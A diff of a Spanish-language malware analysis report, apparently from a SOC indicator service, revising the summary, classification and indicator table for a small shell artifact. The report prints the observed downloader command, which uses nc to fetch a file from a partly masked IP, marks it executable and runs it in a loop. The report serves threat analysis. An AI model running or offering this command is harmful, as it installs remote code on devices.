@@ -4,16 +4,16 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Cambio de permisos, Ejecución. Se asoció 1 comando observado o extraído.
+Artefacto de 154 B. Formato identificado como ASCII text. Entropía registrada: 4.74. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Cambio de permisos, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 3 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
-- **Categoría:** `Payload`
 - **Riesgo:** `Medium`
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:31:49+00:00`
+- **Registrado:** `2026-08-09T19:31:49.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -50,8 +50,8 @@ sh -c "cd /data/local/tmp; nc 85.11.167.XXX 25565 > .system-update; chmod +x .sy
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
 | ip | 85.11.167.XXX | static_analysis |
-| hash | 9ec0680c88c20f69df67aeb8d42406a10356412220582ef072b79644c12ed752 | static_analysis |
 | command | sh -c "cd /data/local/tmp; nc 85.11.167.XXX 25565 > .system-update; chmod +x .system-update; (while true; do ./.system-u | strings |
+| hash | 9ec0680c88c20f69df67aeb8d42406a10356412220582ef072b79644c12ed752 | static_analysis |
 | ip | 5.59.109.XXX | artifact_source |
 
 ## 🛡️ Nota de publicación
